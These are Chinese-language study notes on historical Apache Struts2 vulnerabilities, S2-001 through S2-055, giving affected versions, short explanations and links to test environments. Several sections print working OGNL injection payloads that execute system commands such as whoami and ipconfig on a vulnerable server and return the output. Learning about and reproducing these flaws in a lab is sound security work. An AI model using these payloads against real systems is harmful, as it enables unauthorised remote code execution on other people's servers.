# Struts-S2-xxx

##### Struts 漏洞

2017年`Struts`被爆出的漏洞比以往多了很多，抽时间整理一下其中的环境以及POC和漏洞分析，学习一下其中的漏洞原理和分析，防御，以后如果再次爆发这样漏洞的时候，也能够自己试着分析一下，不用再去傻傻的等着了。

[测试环境]()

##### [Struts 漏洞列表](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)

- S2-001 利用表单错误进行远程代码利用
- S2-002 标签 `<s:url>`和`<s:a>` XSS漏洞
- S2-003  `XWork ParameterInterceptors` 绕过导致`OGNL`执行
- S2-004 提供静态文件时目录遍历漏洞
- S2-005 `XWork ParameterInterceptors` 绕过远程代码执行
- S2-006 `XWork`生成错误页面时的XSS漏洞
- S2-007 当存在错误转换时，用户输入被当作`OGNL`执行
- S2-008 Struts2的一些严重(多个)
- S2-009 `ParameterInterceptor`漏洞允许远程代码执行
- S2-010 当使用 `Struts2 token`机制防护`CSRF`漏洞时，滥用已知会话属性可能绕过token检测
- S2-011 长请求参数名称可能会提高`DOS`攻击
- S2-012 `Showcase app`漏洞可能导致远程代码执行
- S2-013 存在于URL和Anchor Tag的includeParams属性中的漏洞允许远程执行命令
- S2-014 通过在URL和Anchor Tag中强制插入参数引入的漏洞允许远程命令执行，会话访问和操作以及XSS攻击
- S2-015 由通配符匹配机制引入的漏洞或OGNL Expression的双重评估允许远程命令执行。
- S2-016 通过操作带有前缀'action：'/'redirect：'/'redirectAction：'的参数引入的漏洞允许远程命令执行
- S2-017 - 通过操作以“redirect：”/“redirectAction：”为前缀的参数引入的漏洞允许打开重定向
- S2-018 Apache Struts2中的访问控制漏洞
- S2-019 - 默认禁用动态方法调用
- S2-020 将Common Commons FileUpload升级到版本1.3.1（避免DoS攻击），并添加“class”来排除ParametersInterceptor中的参数（避免ClassLoader操作）
- S2-021 - 改进ParametersInterceptor和CookieInterceptor中的排除参数以避免ClassLoader操作
- S2-022 - 在CookieInterceptor中扩展排除参数以避免操纵Struts内部
- S2-023 - 令牌的生成值可以预测
- S2-024 - 错误的excludeParams覆 DefaultExcludedPatternsChecker
- S2-025 - 调试模式下和暴露的JSP文件中的跨站点脚本漏洞
- S2-026中定义的错误 - 特殊顶级对象可用于访问Struts的内部结构
- S2-027 - TextParseUtil.translateVariables不会过滤恶意的OGNL表达式
- S2-028 - 使用具有破坏的URLDecoder实现的JRE可能导致基于Struts 2的Web应用程序出现XSS漏洞。 
- S2-029 - 对标签属性中的原始用户输入进行评估时，强制双重OGNL评估可能导致远程代码执行。 
- S2-030 - I18NInterceptor 
- S2-031中可能的XSS漏洞 - XSLTResult可用于解析任意样式表
- S2-032 - 启用动态方法调用时，可以通过方法：前缀执行远程代码执行。 
- S2-033 - 使用REST插件时可以执行远程代码执行！运行时动态方法调用启用。 
- S2-034 - OGNL缓存中毒可能导致DoS漏洞
- S2-035 - 动作名称清理很容易出错
- S2-036 - 强制性双重OGNL评估，当对原始用户输入的标记属性进行评估时，可能会导致远程代码执行（类似于S2-029）
- S2-037 - 使用REST插件时可以执行远程代码执行。 
- S2-038 - 可以绕过令牌验证并执行CSRF攻击
- S2-039 - Getter作为操作方法导致安全绕过
- S2-040 - 使用现有默认操作方法进行输入验证旁路。
- S2-041 - 使用URLValidator 
- S2-042 - 时可能发生DoS攻击 - Convention插件中可能的路径遍历
- S2-043 - 使用产品中的Config Browser插件
- S2-044 - 使用URLValidator 
- S2-045时可能发生DoS攻击 - 基于Jakarta Multipart解析器执行文件上传时可能的远程执行代码。 
- S2-046 - 基于Jakarta Multipart解析器（类似于S2-045）执行文件上传时的可能RCE 
- S2-047 - 使用URLValidator时可能的DoS攻击（类似于S2-044）
- S2-048 - 可能的RCE Struts展示应用程序Struts 2.3.x系列中的Struts 1插件示例
- S2-049 - DoS攻击可用于Spring受保护的操作
- S2-050 ​​ - 使用URLValidator时的正则表达式拒绝服务（类似于S2-044＆ S2-047）
- S2-051 - 当使用Struts REST插件时，远程攻击者可能通过发送精心设计的xml请求来创建DoS攻击
- S2-052 - 使用带XStream处理程序的Struts REST插件处理XML时可能发生的远程执行代码攻击有效载荷
- S2-053 - 在Freemarker标记中使用非意图表达而不是字符串文字时可能发生的远程执行代码攻击
- S2-054 - 使用Struts REST插件时，可以使用精心制作的JSON请求执行DoS攻击
- S2- 055 - Jacks中的RCE漏洞在JSON库上

历史高危漏洞如下：`S2-001`、`S2-003`、`S2-005`、`S2-007`、`S2-008`，`S2-009`、`S2-012~S2-016`、`S2-019`、`S2-032`、`S2-033`、`S2-037`、`S2-045`、`S2-048`、`S2-052`、`S2-053`、`S2-055`。

##### S2-001

[S2-001环境复现](https://github.com/vulhub/vulhub/tree/master/struts2/s2-001)

[官方链接](https://cwiki.apache.org/confluence/display/WW/S2-001)

该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}
进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析。


**影响版本**

	 Struts 2.0.0 - Struts 2.0.8

** 测试 **

获取 tomcat 执行路径:


	%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}

获取 Web 路径:

	%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}

命令执行

	%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}


![](http://opmi2ydgh.bkt.clouddn.com//18-1-8/83653243.jpg)

![](http://opmi2ydgh.bkt.clouddn.com//18-1-8/44152038.jpg)


##### S2-003

**参考[Struts2和Webwork远程命令执行漏洞分析](http://security.ctocio.com.cn/100/11466600.shtml)、[Struts-S2-003漏洞利用（含环境搭建、含POC）](https://www.jianshu.com/p/c412c2961715)。**

**影响版本**

	Struts 2.0.0 - Struts 2.0.11.2
	2006/9/25    - 2008/6/23

**漏洞介绍**

Struts会将HTTP的每个参数名解析为ognl语句执行(可以理解为Java代码)。ognl表达式通过#来访问struts的对象，Struts框架通过过滤#字符防止安全问题，通过unicode编码(u0023)或8进制(43)即可绕过安全限制。

** 环境搭建 **

[下载](http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip)

解压，将其中的`struts2-showcase-2.0.1.war` 拷贝到`\tomcat\webapps`下，这里重命名了`s2-003`

[参考](https://www.jianshu.com/p/c412c2961715)

复现没有回显。

##### S2-005

** 影响版本 **

	Struts 2.0.0 - Struts 2.1.8.1

[官方链接](https://cwiki.apache.org/confluence/display/WW/S2-005)


S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。
S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。


**POC**

	?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))



![](http://opmi2ydgh.bkt.clouddn.com//18-1-8/82304633.jpg)

更改命令为whoami，提示下载文件。文件中含有执行命令的结果。

![](http://opmi2ydgh.bkt.clouddn.com//18-1-8/43559389.jpg)


##### S2-007

** 影响版本 **

	Struts 2.0.0 - Struts 2.2.3

[官方链接](https://cwiki.apache.org/confluence/display/WW/S2-007)

当有转换错误时，用户输入被评估为OGNL表达式。这允许恶意用户执行任意代码。



* POC

	' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '



![](http://opmi2ydgh.bkt.clouddn.com//18-1-9/44059606.jpg)

会在age中得到相应的信息。


##### S2-008

- 影响版本 

	Struts 2.1.0 - Struts 2.3.1

[官方链接](https://cwiki.apache.org/confluence/display/WW/S2-008)

[参考](http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities)


>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。

>例如在 devMode 模式下直接添加参数 ?debug=command&expression= 会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：

	/showcase.action?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="ipconfig",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))


##### S2-009

影响版本: 2.1.0 - 2.3.1.1

[S2-009](https://github.com/sie504/vulhub/tree/master/struts2/s2-009)

![](http://opmi2ydgh.bkt.clouddn.com//18-1-9/43990420.jpg)


##### S2-012

影响版本: 2.1.0 - 2.3.13

[官方链接](https://cwiki.apache.org/confluence/display/WW/S2-012)

	%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}


![](http://opmi2ydgh.bkt.clouddn.com//18-1-9/80192149.jpg)


##### S2-013,S2-014

影响版本： Struts 2.0.0 - Struts 2.3.14-Struts 2.0.0 - Struts 2.3.14.1

[S2-013](https://cwiki.apache.org/confluence/display/WW/S2-013)

[S2-014](https://cwiki.apache.org/confluence/display/WW/S2-014)

 POC

	/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('calc').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D


![](http://opmi2ydgh.bkt.clouddn.com//18-1-9/26707957.jpg)

##### S2-016

影响版本：Struts 2.0.0 - Struts 2.3.15

[官方链接](https://cwiki.apache.org/confluence/display/WW/S2-016)

[S2-016](http://www.freebuf.com/vuls/11220.html)


##### S2-032

影响版本： Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)


[官方链接](https://cwiki.apache.org/confluence/display/WW/S2-032)

[Apache Struts2 s2-032技术分析及漏洞检测脚本](http://blog.topsec.com.cn/ad_lab/apache-structs2-s2-032%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/)


##### S2-037

影响版本：Struts 2.3.20 - Struts Struts 2.3.28.1

[官网](https://cwiki.apache.org/confluence/display/WW/S2-037)



##### S2-045


影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

[官网](https://cwiki.apache.org/confluence/display/WW/S2-045)

##### S2-052

影响版本： Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12

[官网](https://cwiki.apache.org/confluence/display/WW/S2-052)

##### S2-053

影响版本： Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10

[官网](https://cwiki.apache.org/confluence/display/WW/S2-053)

##### S2-055 

影响版本：Struts 2.5 - Struts 2.5.14

[官网](https://cwiki.apache.org/confluence/display/WW/S2-055)




##### 参考

[Security Bulletins](https://cwiki.apache.org/confluence/display/WW/Security+Bulletins)

[Struts漏洞](https://www.jianshu.com/u/1c02feec61cd)

[浅谈struts2历史上的高危漏洞](https://www.anquanke.com/post/id/86757)


[struts各版本](https://github.com/apache/struts/releases)

[struts各版本](http://archive.apache.org/dist/struts/)

[Struts2 命令执行系列回顾](http://www.zerokeeper.com/vul-analysis/struts2-command-execution-series-review.html)

[Struts2 历史 RCE 漏洞回顾不完全系列](http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities)

[Struts docker环境](https://github.com/vulhub/vulhub/tree/master/struts2)